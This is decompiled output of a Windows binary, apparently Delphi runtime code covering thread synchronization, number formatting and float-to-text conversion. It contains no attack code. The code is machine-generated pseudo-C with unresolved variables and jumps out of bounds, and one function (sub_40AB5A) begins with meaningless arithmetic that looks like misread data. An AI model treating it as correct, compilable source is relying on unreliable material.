//----- (0040A430) --------------------------------------------------------
int __usercall sub_40A430@<eax>(int a1@<eax>)
{
  if ( !a1 )
    sub_40A398();
  return a1;
}

//----- (0040A440) --------------------------------------------------------
int sub_40A440()
{
  _DWORD *v0; // eax
  int result; // eax

  while ( dword_41C2E0 )
  {
    v0 = dword_41C2E0;
    dword_41C2E0 = (_DWORD *)*dword_41C2E0;
    result = sub_4025B0((int)v0);
  }
  return result;
}
// 41C2E0: using guessed type _DWORD *dword_41C2E0;

//----- (0040A460) --------------------------------------------------------
HMODULE sub_40A460()
{
  HMODULE result; // eax

  result = GetModuleHandleA_1("kernel32.dll");
  if ( result )
  {
    result = (HMODULE)GetProcAddress_0(result, "GetDiskFreeSpaceExA");
    dword_41C128 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))result;
  }
  if ( !dword_41C128 )
  {
    result = (HMODULE)sub_40745C;
    dword_41C128 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_40745C;
  }
  return result;
}
// 41C128: using guessed type int (__stdcall *dword_41C128)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040A4BC) --------------------------------------------------------
_DWORD *__usercall sub_40A4BC@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi

  if ( a2 )
    a1 = (_DWORD *)sub_402CDC((int)a1, a2);
  v2 = a2;
  v3 = a1;
  sub_402BAC(a1, 0);
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(v3 + 1));
  v3[7] = CreateEventA(0, -1, -1, 0);
  sub_4045A0(v3 + 10, (int)&unk_406BFC, 1, 4);
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 40A4CA: variable 'a2' is possibly undefined

//----- (0040A524) --------------------------------------------------------
void __usercall sub_40A524(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_40A5A0((int)v2);
  sub_402BCC(v5, v4 & 0xFC);
  CloseHandle_0((HANDLE)v5[7]);
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v5 + 1));
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 40A52B: variable 'v3' is possibly undefined

//----- (0040A564) --------------------------------------------------------
bool __usercall sub_40A564@<al>(int a1@<eax>)
{
  bool result; // al
  int v3; // ebx
  int v4; // edx
  int v5; // eax

  result = 0;
  if ( *(_DWORD *)(a1 + 44) )
  {
    v3 = 0;
    v4 = sub_4043EC(*(_DWORD *)(a1 + 40));
    while ( v4 > v3 )
    {
      v5 = *(_DWORD *)(*(_DWORD *)(a1 + 40) + 8 * v3);
      if ( v5 )
      {
        if ( v5 != *(_DWORD *)(a1 + 44) )
          break;
      }
      ++v3;
    }
    return v4 <= v3;
  }
  return result;
}

//----- (0040A5A0) --------------------------------------------------------
void __usercall sub_40A5A0(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 4));
  if ( !*(_BYTE *)(a1 + 52) )
  {
    *(_DWORD *)(a1 + 44) = GetCurrentThreadId_0();
    if ( !sub_40A564(a1) )
      WaitForSingleObject(*(HANDLE *)(a1 + 28), 0xFFFFFFFF);
    *(_DWORD *)(a1 + 36) = *(_DWORD *)(a1 + 32);
    *(_DWORD *)(a1 + 32) = 0;
    *(_DWORD *)(a1 + 44) = 0;
    *(_BYTE *)(a1 + 52) = 1;
  }
  ++*(_DWORD *)(a1 + 32);
}

//----- (0040A5EC) --------------------------------------------------------
_DWORD *__usercall sub_40A5EC@<eax>(_DWORD **a1@<eax>)
{
  _DWORD *v1; // edx

  v1 = *a1;
  *a1 = 0;
  return sub_402BDC(v1);
}

//----- (0040A8E8) --------------------------------------------------------
int __userpurge sub_40A8E8@<eax>(_BYTE *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5, unsigned __int8 a6)
{
  return sub_40A8EE(a1, a2, a3, a4, a5, a6);
}

//----- (0040A8EE) --------------------------------------------------------
int __userpurge sub_40A8EE@<eax>(_BYTE *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5, unsigned __int8 a6)
{
  int v6; // eax
  int v7; // eax
  _BYTE *v8; // edi
  int v9; // ecx
  int v10; // ebx
  int v12; // [esp-4h] [ebp-2Ch]
  __int16 v13; // [esp+Ch] [ebp-1Ch] BYREF
  char v14[21]; // [esp+Fh] [ebp-19h] BYREF
  _BYTE *v15; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF
  int v17; // [esp+34h] [ebp+Ch]

  v15 = a1;
  v6 = 19;
  if ( !a3 )
  {
    v6 = a5;
    if ( a5 < 2 )
      v6 = 2;
    if ( v6 > 18 )
      v6 = 18;
  }
  v17 = v6;
  v12 = v6;
  v7 = 9999;
  if ( a6 >= 2u )
    v7 = a4;
  sub_40AE91((int)&v13, a2, a3, v7, v12);
  v8 = v15;
  if ( (unsigned int)(unsigned __int16)v13 - 0x7FFF >= 2 )
  {
    v10 = a6;
    if ( a6 != 1 && (a6 > 4u || v13 > v17) )
      LOBYTE(v10) = 0;
    ((void (__usercall *)(int@<ebp>, _BYTE *@<edi>, char *@<esi>))funcs_40A97A[v10])((int)&savedregs, v15, v14);
  }
  else
  {
    sub_40A9AC((int)&savedregs, v15);
    qmemcpy(v8, (char *)sub_40A8E8 + 3 * v9, 3u);
    v8 += 3;
  }
  return v8 - v15;
}
// 40A94E: variable 'v9' is possibly undefined
// 40A98F: using guessed type int (*funcs_40A97A[5])();
// 40A8EE: using guessed type unsigned __int16 var_1C;
// 40A8EE: using guessed type char var_19[21];

//----- (0040A9A3) --------------------------------------------------------
char __usercall sub_40A9A3@<al>(char *a1@<esi>)
{
  char result; // al

  result = *a1;
  if ( !*a1 )
    return 48;
  return result;
}

//----- (0040A9AC) --------------------------------------------------------
char __usercall sub_40A9AC@<al>(int a1@<ebp>, _BYTE *a2@<edi>)
{
  char result; // al

  if ( *(_BYTE *)(a1 - 26) )
  {
    result = 45;
    *a2 = 45;
  }
  return result;
}

//----- (0040A9B6) --------------------------------------------------------
char __usercall sub_40A9B6@<al>(int a1@<ebp>, _BYTE *a2@<edi>, char *a3@<esi>)
{
  signed int v3; // ecx
  int v4; // edx
  char result; // al
  _BYTE *v6; // edi
  char *v7; // edi
  unsigned int v8; // ecx
  char *v9; // edi
  char v10; // al
  __int16 v11; // ax

  sub_40A9AC(a1, a2);
  v3 = *(__int16 *)(a1 - 28);
  v4 = 0;
  if ( v3 > *(_DWORD *)(a1 + 12) || v3 < -3 )
  {
    v3 = 1;
    v4 = 1;
    do
    {
LABEL_7:
      v10 = *a3++;
      if ( !v10 )
      {
        result = 48;
        memset(a2, 48, v3);
        goto LABEL_14;
      }
      *a2++ = v10;
      --v3;
    }
    while ( v3 );
    result = *a3++;
    if ( !result )
      goto LABEL_14;
    HIBYTE(v11) = result;
    LOBYTE(v11) = byte_41E4EF;
    *(_WORD *)a2 = v11;
    v9 = a2 + 2;
  }
  else
  {
    if ( v3 > 0 )
      goto LABEL_7;
    result = 48;
    *a2 = 48;
    v6 = a2 + 1;
    if ( !*a3 )
      return result;
    *v6 = byte_41E4EF;
    v7 = v6 + 1;
    v8 = -v3;
    memset(v7, 48, v8);
    v9 = &v7[v8];
  }
  while ( 1 )
  {
    result = *a3++;
    if ( !result )
      break;
    *v9++ = result;
  }
LABEL_14:
  if ( v4 )
    JUMPOUT(0x40AA42);
  return result;
}
// 40AA15: control flows out of bounds to 40AA42
// 41E4EF: using guessed type char byte_41E4EF;

//----- (0040AA18) --------------------------------------------------------
int __usercall sub_40AA18@<eax>(int a1@<ebp>, _BYTE *a2@<edi>, char *a3@<esi>)
{
  __int16 v3; // ax
  char *v4; // edi
  int v5; // ecx
  __int16 v6; // ax
  unsigned int v7; // ecx

  sub_40A9AC(a1, a2);
  LOBYTE(v3) = sub_40A9A3(a3);
  HIBYTE(v3) = byte_41E4EF;
  *(_WORD *)a2 = v3;
  v4 = a2 + 2;
  do
    *v4++ = sub_40A9A3(a3);
  while ( v5 != 1 );
  HIBYTE(v6) = 43;
  v7 = *(_DWORD *)(a1 + 8);
  if ( v7 >= 4 )
    v7 = 0;
  LOBYTE(v6) = 69;
  return sub_40AA4C(v6, *(__int16 *)(a1 - 28) - 1, v7, *(_BYTE *)(a1 - 25), v4);
}
// 40AA34: variable 'v5' is possibly undefined
// 41E4EF: using guessed type char byte_41E4EF;

//----- (0040AA4C) --------------------------------------------------------
int __usercall sub_40AA4C@<eax>(__int16 a1@<ax>, int a2@<edx>, int a3@<ecx>, char a4@<bl>, _BYTE *a5@<edi>)
{
  char *v5; // edi
  char v6; // al
  unsigned int v7; // eax
  int *v8; // ebx
  unsigned int v9; // et2
  int v11; // [esp-4h] [ebp-4h] BYREF

  *a5 = a1;
  v5 = a5 + 1;
  if ( a4 )
  {
    if ( a2 < 0 )
    {
      v6 = 45;
      a2 = -a2;
LABEL_7:
      *v5++ = v6;
      goto LABEL_8;
    }
  }
  else
  {
    a2 = 0;
  }
  if ( HIBYTE(a1) )
  {
    v6 = HIBYTE(a1);
    goto LABEL_7;
  }
LABEL_8:
  v7 = a2;
  v11 = a2;
  v8 = &v11;
  do
  {
    do
    {
      v9 = v7 % 0xA;
      v7 /= 0xAu;
      *(_BYTE *)v8 = v9 + 48;
      v8 = (int *)((char *)v8 + 1);
      --a3;
    }
    while ( v7 );
  }
  while ( a3 > 0 );
  do
  {
    v8 = (int *)((char *)v8 - 1);
    *v5++ = *(_BYTE *)v8;
  }
  while ( v8 != &v11 );
  return v11;
}

//----- (0040AA90) --------------------------------------------------------
char __usercall sub_40AA90@<al>(int a1@<ebp>, char *a2@<edi>, char *a3@<esi>)
{
  unsigned int v3; // edx
  int v4; // ecx
  char result; // al
  int v6; // ebx
  int v7; // ecx
  char *v8; // edi
  int v9; // edx

  v3 = *(_DWORD *)(a1 + 8);
  if ( v3 >= 0x12 )
    v3 = 18;
  v4 = *(__int16 *)(a1 - 28);
  if ( v4 > 0 )
  {
    v6 = 0;
    if ( *(_BYTE *)(a1 + 16) != 2 )
    {
      LOBYTE(v6) = (unsigned __int16)(v4 - 1) % 3u;
      ++v6;
    }
    while ( 1 )
    {
      result = sub_40A9A3(a3);
      *a2++ = result;
      v4 = v7 - 1;
      if ( !v4 )
        break;
      if ( !--v6 )
      {
        *a2++ = byte_41E4EE;
        v6 = 3;
      }
    }
  }
  else
  {
    result = 48;
    *a2++ = 48;
  }
  if ( v3 )
  {
    *a2 = byte_41E4EF;
    v8 = a2 + 1;
    if ( v4 )
    {
      result = 48;
      while ( 1 )
      {
        *v8++ = 48;
        if ( !--v3 )
          break;
        if ( !++v4 )
          goto LABEL_15;
      }
    }
    else
    {
      do
      {
LABEL_15:
        result = sub_40A9A3(a3);
        *v8++ = result;
      }
      while ( v9 != 1 );
    }
  }
  return result;
}
// 40AAC2: variable 'v7' is possibly undefined
// 40AAD4: variable 'v3' is possibly undefined
// 40AAEE: variable 'v9' is possibly undefined
// 41E4EE: using guessed type char byte_41E4EE;
// 41E4EF: using guessed type char byte_41E4EF;

//----- (0040AAF1) --------------------------------------------------------
void __usercall sub_40AAF1(int a1@<ebp>, _BYTE *a2@<edi>, char *a3@<esi>)
{
  int v3; // ebx
  __int16 v4; // cx
  char *v5; // ebx
  int v6; // ecx
  char v7; // al
  int v8; // [esp-4h] [ebp-4h]

  v3 = (unsigned __int8)byte_41E4EC;
  v4 = 3;
  if ( *(_BYTE *)(a1 - 26) )
  {
    LOBYTE(v3) = byte_41E4ED;
    v4 = 1039;
  }
  if ( (unsigned __int8)v3 > (unsigned __int8)v4 )
    LOBYTE(v3) = v4;
  LOBYTE(v3) = HIBYTE(v4) + v3;
  v5 = (char *)sub_40AB5A + 5 * v3;
  v6 = 5;
  do
  {
    v7 = *v5;
    if ( *v5 == 64 )
      break;
    v8 = v6;
    if ( v7 == 36 )
    {
      sub_40AB48(a2);
    }
    else if ( v7 == 42 )
    {
      sub_40AA90(a1, a2, a3);
    }
    else
    {
      *a2++ = v7;
    }
    ++v5;
    v6 = v8 - 1;
  }
  while ( v8 != 1 );
}
// 41E4EC: using guessed type char byte_41E4EC;
// 41E4ED: using guessed type char byte_41E4ED;

//----- (0040AB48) --------------------------------------------------------
void __usercall sub_40AB48(void *a1@<edi>)
{
  if ( dword_41E4E8 )
    qmemcpy(a1, (const void *)dword_41E4E8, *(_DWORD *)(dword_41E4E8 - 4));
}
// 41E4E8: using guessed type int dword_41E4E8;

//----- (0040AB5A) --------------------------------------------------------
_BYTE *__userpurge sub_40AB5A@<eax>(int a1@<eax>, int a2@<edx>, _BYTE *a3@<ecx>, int a4@<ebp>, char *a5@<esi>, int a6)
{
  int v6; // eax
  char v8; // bl
  int v9; // ecx
  char v10; // zf
  int v11; // eax
  int v12; // edx
  __int16 v14; // [esp-44h] [ebp-44h] BYREF
  char v15; // [esp-41h] [ebp-41h]
  int v16; // [esp-1Ch] [ebp-1Ch]
  int v17; // [esp-18h] [ebp-18h]
  char *v18; // [esp-14h] [ebp-14h]
  char v19; // [esp-10h] [ebp-10h]
  _BYTE *v20; // [esp-8h] [ebp-8h]
  int v21; // [esp-4h] [ebp-4h] BYREF

  LOBYTE(a1) = a1 & 0x2A;
  v6 = a1 + 3;
  BYTE1(v6) -= *(_BYTE *)(3 * v6);
  v6 += 2;
  LOBYTE(v6) = v6 & 0x20;
  LOBYTE(v6) = v6 - *(_BYTE *)(v6 + 64);
  BYTE1(v6) -= *(_BYTE *)v6;
  LOBYTE(v6) = v6 & 0x40;
  ++v6;
  *(_BYTE *)(a2 + a4) -= BYTE1(v6);
  *(_DWORD *)(v6 + 45) -= v6;
  LOBYTE(v6) = v6 & 0x2A;
  v6 += 2;
  LOBYTE(v6) = v6 & 0x2D;
  LOBYTE(v6) = (v6 - *(_BYTE *)(v6 + 64)) & 0x2A;
  v6 -= 707280960;
  LOBYTE(v6) = v6 & 0x29;
  v6 -= 1077945385;
  LOBYTE(v6) = v6 & 0x2D;
  v6 += 2142355380;
  BYTE1(v6) -= *(_BYTE *)v6;
  LOBYTE(v6) = v6 & 0x2D;
  ++v6;
  LOBYTE(v6) = v6 & 0x20;
  BYTE1(a3) = BYTE1(a3) - MEMORY[0x2A404024] - MEMORY[0x2D202440];
  LOBYTE(v6) = v6 - *(_BYTE *)(v6 + 42);
  v6 -= 675292192;
  LOBYTE(v6) = v6 & 0x20;
  BYTE1(a3) -= *a3;
  *(_BYTE *)a2 -= BYTE1(a3);
  a3[a4] &= BYTE1(v6);
  v21 = a4;
  v20 = (_BYTE *)v6;
  v8 = (char)a3;
  v9 = 2;
  if ( v8 )
  {
    if ( *(_QWORD *)a2 )
      v9 = *(_DWORD *)(a2 + 4) >> 31;
  }
  else if ( *(_DWORD *)(a2 + 4) | *(_DWORD *)a2 | *(unsigned __int16 *)(a2 + 8) )
  {
    v9 = *(unsigned __int16 *)(a2 + 8) >> 15;
  }
  sub_40AC8A(v9, (int)&v21);
  if ( v10 )
    return (_BYTE *)sub_40A8EE(v20, a2, v8, 0, 15, 0);
  sub_40ACC5((int)&v21, a5);
  v11 = v17;
  v12 = 9999;
  if ( !v19 )
  {
    v12 = v17 - v16;
    v11 = 18;
  }
  sub_40AE91((int)&v14, a2, v8, v12, v11);
  if ( v14 == (__int16)0x8000 || v14 == 0x7FFF || !v8 && v14 > 18 && !v19 )
    return (_BYTE *)sub_40A8EE(v20, a2, v8, 0, 15, 0);
  if ( !v15 )
  {
    sub_40AC8A(2, (int)&v21);
    if ( v10 )
      return (_BYTE *)sub_40A8EE(v20, a2, v8, 0, 15, 0);
    if ( a5 != v18 )
      sub_40ACC5((int)&v21, a5);
  }
  return sub_40AD70((int)&v21);
}
// 40ABFE: variable 'v10' is possibly undefined

//----- (0040AC8A) --------------------------------------------------------
char __usercall sub_40AC8A@<al>(int a1@<ecx>, int a2@<ebp>)
{
  char *v2; // esi
  char v3; // al
  char result; // al
  char v5; // ah
  char v6; // al

  v2 = *(char **)(a2 + 8);
  if ( a1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = *v2++;
        if ( v3 != 39 && v3 != 34 )
          break;
        v5 = v3;
        while ( 1 )
        {
          v6 = *v2++;
          if ( v6 == v5 )
            break;
          if ( !v6 )
            return **(_BYTE **)(a2 + 8);
        }
      }
      if ( !v3 )
        break;
      if ( v3 == 59 && !--a1 )
      {
        result = *v2;
        if ( *v2 && result != 59 )
          return result;
        return **(_BYTE **)(a2 + 8);
      }
    }
  }
  return **(_BYTE **)(a2 + 8);
}

//----- (0040ACC5) --------------------------------------------------------
int __usercall sub_40ACC5@<eax>(int a1@<ebp>, char *a2@<esi>)
{
  int v2; // ebx
  int v3; // ecx
  int v4; // edx
  char v5; // al
  char v6; // ah
  char v7; // al
  int v8; // eax
  bool v9; // cc
  int v10; // eax
  int v11; // eax
  int result; // eax

  *(_DWORD *)(a1 - 16) = a2;
  v2 = 0x7FFF;
  v3 = 0;
  v4 = 0;
  *(_DWORD *)(a1 - 24) = -1;
  *(_BYTE *)(a1 - 8) = 0;
  *(_BYTE *)(a1 - 12) = 0;
  do
  {
LABEL_2:
    v5 = *a2++;
    while ( 1 )
    {
      switch ( v5 )
      {
        case '#':
          ++v4;
          goto LABEL_2;
        case '0':
          if ( v4 < v2 )
            v2 = v4;
          v3 = ++v4;
          goto LABEL_2;
        case '.':
          if ( *(_DWORD *)(a1 - 24) == -1 )
            *(_DWORD *)(a1 - 24) = v4;
          goto LABEL_2;
        case ',':
          *(_BYTE *)(a1 - 8) = 1;
          goto LABEL_2;
        case '\'':
        case '"':
          v6 = v5;
          while ( 1 )
          {
            v7 = *a2++;
            if ( v7 == v6 )
              goto LABEL_2;
            if ( !v7 )
              goto LABEL_30;
          }
      }
      if ( v5 != 69 && v5 != 101 )
        break;
      v5 = *a2++;
      if ( v5 == 45 || v5 == 43 )
      {
        *(_BYTE *)(a1 - 12) = 1;
        do
          v5 = *a2++;
        while ( v5 == 48 );
      }
    }
  }
  while ( v5 != 59 && v5 );
LABEL_30:
  *(_DWORD *)(a1 - 20) = v4;
  if ( *(_DWORD *)(a1 - 24) == -1 )
    *(_DWORD *)(a1 - 24) = v4;
  v8 = *(_DWORD *)(a1 - 24);
  v9 = v8 <= v3;
  v10 = v8 - v3;
  if ( !v9 )
    v10 = 0;
  *(_DWORD *)(a1 - 32) = v10;
  v11 = *(_DWORD *)(a1 - 24);
  v9 = v11 < v2;
  result = v11 - v2;
  if ( v9 )
    result = 0;
  *(_DWORD *)(a1 - 28) = result;
  return result;
}

//----- (0040AD70) --------------------------------------------------------
_BYTE *__usercall sub_40AD70@<eax>(int a1@<ebp>)
{
  int v1; // eax
  int v2; // edx
  char *v3; // esi
  _BYTE *v4; // edi
  __int16 v5; // ax
  char v6; // ah
  char v7; // al
  unsigned int v8; // ecx

  if ( *(_BYTE *)(a1 - 12) )
  {
    v1 = *(_DWORD *)(a1 - 24);
    v2 = 0;
  }
  else
  {
    v1 = *(__int16 *)(a1 - 64);
    if ( v1 <= *(_DWORD *)(a1 - 24) )
      v1 = *(_DWORD *)(a1 - 24);
    v2 = *(__int16 *)(a1 - 64) - *(_DWORD *)(a1 - 24);
  }
  *(_DWORD *)(a1 - 36) = v1;
  *(_DWORD *)(a1 - 40) = v2;
  v3 = *(char **)(a1 - 16);
  v4 = *(_BYTE **)(a1 - 4);
  if ( *(_BYTE *)(a1 - 62) && v3 == *(char **)(a1 + 8) )
    *v4++ = 45;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        do
        {
          while ( 1 )
          {
            LOBYTE(v5) = *v3++;
            if ( (_BYTE)v5 != 35 && (_BYTE)v5 != 48 )
              break;
            sub_40AE2B((_BYTE *)(a1 - 61), a1, v4);
          }
        }
        while ( (_BYTE)v5 == 46 || (_BYTE)v5 == 44 );
        if ( (_BYTE)v5 != 39 && (_BYTE)v5 != 34 )
          break;
        v6 = v5;
        while ( 1 )
        {
          v7 = *v3++;
          if ( v7 == v6 )
            break;
          if ( !v7 )
            return &v4[-*(_DWORD *)(a1 - 4)];
          *v4++ = v7;
        }
      }
      if ( (_BYTE)v5 != 69 && (_BYTE)v5 != 101 )
        break;
      HIBYTE(v5) = *v3;
      if ( *v3 != 43 )
      {
        if ( HIBYTE(v5) != 45 )
          goto LABEL_19;
        HIBYTE(v5) = 0;
      }
      v8 = -1;
      do
      {
        ++v8;
        ++v3;
      }
      while ( *v3 == 48 );
      if ( v8 >= 4 )
        v8 = 4;
      sub_40AA4C(v5, *(__int16 *)(a1 - 64) - *(_DWORD *)(a1 - 24), v8, *(_BYTE *)(a1 - 61), v4);
    }
    if ( (_BYTE)v5 == 59 || !(_BYTE)v5 )
      return &v4[-*(_DWORD *)(a1 - 4)];
LABEL_19:
    *v4++ = v5;
  }
}

//----- (0040AE2B) --------------------------------------------------------
char __usercall sub_40AE2B@<al>(_BYTE *a1@<ebx>, int a2@<ebp>, _BYTE *a3@<edi>)
{
  if ( *(_DWORD *)(a2 - 40) )
  {
    if ( *(int *)(a2 - 40) < 0 )
    {
      ++*(_DWORD *)(a2 - 40);
      if ( *(_DWORD *)(a2 - 36) > *(_DWORD *)(a2 - 28) )
        JUMPOUT(0x40AE8D);
      JUMPOUT(0x40AE5C);
    }
    do
      sub_40AE4C(a1, a2, a3);
    while ( (*(_DWORD *)(a2 - 40))-- != 1 );
  }
  return sub_40AE4C(a1, a2, a3);
}
// 40AE4A: control flows out of bounds to 40AE8D
// 40AE48: control flows out of bounds to 40AE5C

//----- (0040AE4C) --------------------------------------------------------
char __usercall sub_40AE4C@<al>(_BYTE *a1@<ebx>, int a2@<ebp>, _BYTE *a3@<edi>)
{
  int v3; // eax
  _BYTE *v4; // edi
  __int16 v5; // t2

  LOBYTE(v3) = *a1;
  if ( !*a1 )
  {
    v3 = *(_DWORD *)(a2 - 36);
    if ( v3 <= *(_DWORD *)(a2 - 32) )
      goto LABEL_10;
    LOBYTE(v3) = 48;
  }
  if ( *(_DWORD *)(a2 - 36) )
  {
    *a3 = v3;
    v4 = a3 + 1;
    if ( *(_BYTE *)(a2 - 8) )
    {
      v3 = *(_DWORD *)(a2 - 36);
      if ( v3 > 1 )
      {
        v5 = (unsigned __int16)v3 % 3u;
        LOBYTE(v3) = (unsigned __int16)v3 / 3u;
        if ( (_BYTE)v5 == 1 )
        {
          LOBYTE(v3) = byte_41E4EE;
          *v4 = byte_41E4EE;
        }
      }
    }
  }
  else
  {
    BYTE1(v3) = v3;
    LOBYTE(v3) = byte_41E4EF;
    *(_WORD *)a3 = v3;
  }
LABEL_10:
  --*(_DWORD *)(a2 - 36);
  return v3;
}
// 41E4EE: using guessed type char byte_41E4EE;
// 41E4EF: using guessed type char byte_41E4EF;

//----- (0040AE91) --------------------------------------------------------
_BYTE *__userpurge sub_40AE91@<eax>(int a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5)
{
  int savedregs; // [esp+26h] [ebp+0h] BYREF

  if ( a3 )
    return sub_40AFBF(a1, (int)&savedregs, a2);
  else
    return (_BYTE *)sub_40AEB8(a1, (int)&savedregs, a2);
}

//----- (0040AEB8) --------------------------------------------------------
int __usercall sub_40AEB8@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<esi>)
{
  __int16 v3; // dx
  int result; // eax
  long double v5; // st7
  __int16 v8; // fps
  bool v9; // c0
  char v10; // c2
  bool v11; // c3
  _WORD *v12; // edi
  int v13; // edx
  __int16 v14; // ax
  int v15; // edi

  v3 = *(_WORD *)(a3 + 8);
  result = v3 & 0x7FFF;
  if ( (v3 & 0x7FFF) == 0 )
    goto LABEL_7;
  if ( result == 0x7FFF )
  {
    if ( *(__int16 *)(a3 + 6) >= 0 || !*(_DWORD *)a3 && *(_DWORD *)(a3 + 4) == 0x80000000 )
      goto LABEL_8;
    result = 0x8000;
LABEL_7:
    v3 = 0;
LABEL_8:
    *(_BYTE *)(a1 + 3) = 0;
    goto LABEL_28;
  }
  v5 = *(double *)a3;
  *(_DWORD *)(a2 - 8) = ((19728 * (result - 0x3FFF)) >> 16) + 1;
  _ST7 = fabs(v5);
  sub_4052BC(18 - *(_DWORD *)(a2 - 8));
  __asm { frndint }
  v9 = _ST7 > -1.069934862234205e145;
  v10 = 0;
  v11 = -1.069934862234205e145 == _ST7;
  *(_WORD *)(a2 - 4) = v8;
  if ( (*(_WORD *)(a2 - 4) & 0x4100) != 0 )
  {
    _ST7 = _ST7 / (double)10;
    ++*(_DWORD *)(a2 - 8);
  }
  __FBSTP__((_TBYTE *)(a2 - 26), _ST7);
  v12 = (_WORD *)(a1 + 3);
  v13 = 9;
  do
  {
    HIBYTE(v14) = *(_BYTE *)(a2 + v13 - 27);
    LOBYTE(v14) = HIBYTE(v14) >> 4;
    HIBYTE(v14) &= 0xFu;
    *v12++ = v14 + 12336;
    --v13;
  }
  while ( v13 );
  *(_BYTE *)v12 = 0;
  v15 = *(_DWORD *)(a2 + 8) + *(_DWORD *)(a2 - 8);
  if ( v15 < 0 )
  {
    result = 0;
    goto LABEL_7;
  }
  if ( (unsigned int)v15 >= *(_DWORD *)(a2 + 12) )
    v15 = *(_DWORD *)(a2 + 12);
  if ( (unsigned int)v15 >= 0x12 )
  {
    v15 = 18;
LABEL_24:
    while ( 1 )
    {
      *(_BYTE *)(a1 + v15-- + 3) = 0;
      if ( v15 < 0 )
        break;
      if ( *(_BYTE *)(a1 + v15 + 3) != 48 )
        goto LABEL_26;
    }
    v3 = 0;
  }
  else
  {
    if ( *(_BYTE *)(a1 + v15 + 3) < 0x35u )
      goto LABEL_24;
    while ( 1 )
    {
      *(_BYTE *)(a1 + v15-- + 3) = 0;
      if ( v15 < 0 )
        break;
      if ( ++*(_BYTE *)(a1 + v15 + 3) <= 0x39u )
        goto LABEL_26;
    }
    *(_WORD *)(a1 + 3) = 49;
    ++*(_DWORD *)(a2 - 8);
LABEL_26:
    v3 = *(_WORD *)(a3 + 8);
  }
  result = *(_DWORD *)(a2 - 8);
LABEL_28:
  *(_WORD *)a1 = result;
  *(_BYTE *)(a1 + 2) = v3 < 0;
  return result;
}

//----- (0040AFBF) --------------------------------------------------------
_BYTE *__usercall sub_40AFBF@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<esi>)
{
  unsigned __int64 v3; // rax
  int v4; // ecx
  int v5; // edi
  bool v6; // cf
  long double v7; // st7
  int v8; // edx
  _BYTE *v9; // edi
  int v10; // ecx
  unsigned __int8 v11; // ah
  char v12; // al
  char v13; // al
  _BYTE *result; // eax
  int v15; // edx

  v3 = *(_QWORD *)a3;
  if ( *(_QWORD *)a3 )
  {
    if ( (v3 & 0x8000000000000000ui64) != 0i64 )
      v3 = -(__int64)v3;
    v4 = 0;
    v5 = *(_DWORD *)(a2 + 8);
    if ( v5 < 0 )
      v5 = 0;
    if ( v5 >= 4 )
    {
      v5 = 4;
      do
      {
        ++v4;
        v6 = v3 < 0xDE0B6B3A7640000i64;
        v3 -= 1000000000000000000i64;
      }
      while ( !v6 );
      --v4;
      v3 += 1000000000000000000i64;
    }
    *(_QWORD *)(a2 - 16) = v3;
    v7 = (double)*(__int64 *)(a2 - 16);
    v8 = v5;
    if ( v5 != 4 )
      v7 = v7 / (double)dword_40A8C8[4 - v5];
    __FBSTP__((_TBYTE *)(a2 - 26), v7);
    v9 = (_BYTE *)(a1 + 3);
    if ( v4 )
    {
      *v9 = v4 + 48;
      v9 = (_BYTE *)(a1 + 4);
      v10 = 9;
      goto LABEL_19;
    }
    v10 = 9;
    while ( 1 )
    {
      v11 = *(_BYTE *)(a2 + v10 - 27);
      v12 = v11 >> 4;
      if ( v11 >> 4 )
        goto LABEL_20;
      v13 = v11 & 0xF;
      if ( (v11 & 0xF) != 0 )
        break;
      if ( !--v10 )
        goto LABEL_25;
    }
    while ( 1 )
    {
      *v9++ = v13 + 48;
      if ( !--v10 )
        break;
LABEL_19:
      v11 = *(_BYTE *)(a2 + v10 - 27);
      v12 = v11 >> 4;
LABEL_20:
      *v9++ = v12 + 48;
      v13 = v11 & 0xF;
    }
    result = &v9[-a1 - 3 - v8];
    do
      *v9-- = 0;
    while ( *v9 == 48 );
    v15 = *(_DWORD *)(a3 + 4) >> 31;
  }
  else
  {
LABEL_25:
    result = 0;
    LOBYTE(v15) = 0;
    *(_BYTE *)(a1 + 3) = 0;
  }
  *(_WORD *)a1 = (_WORD)result;
  *(_BYTE *)(a1 + 2) = v15;
  return result;
}
// 40A8C8: using guessed type int dword_40A8C8[];

//----- (0040B13B) --------------------------------------------------------
char __usercall sub_40B13B@<al>(char *a1@<esi>)
{
  char result; // al

  do
    result = *a1++;
  while ( result && result == 32 );
  return result;
}

//----- (0040B146) --------------------------------------------------------
double __usercall sub_40B146@<st0>(int a1@<ebp>, char *a2@<esi>, double result@<st0>)
{
  int v3; // eax
  int i; // edx
  char v5; // al
  bool v6; // cf

  v3 = 0;
  for ( i = 0; ; ++i )
  {
    v5 = *a2++;
    v5 -= 58;
    v6 = __CFADD__(v5, 10);
    LOBYTE(v3) = v5 + 10;
    if ( !v6 )
      break;
    *(_DWORD *)(a1 - 4) = v3;
    result = result * (double)10 + (double)*(int *)(a1 - 4);
  }
  return result;
}

//----- (0040B162) --------------------------------------------------------
char __usercall sub_40B162@<al>(_BYTE *a1@<esi>)
{
  int v1; // eax
  unsigned int v2; // edx
  char v3; // al
  bool v4; // cf

  v1 = 0;
  v2 = 0;
  if ( *a1 == 43 || *a1 == 45 )
    ++a1;
  do
  {
    v3 = *a1 - 58;
    v4 = __CFADD__(v3, 10);
    LOBYTE(v1) = v3 + 10;
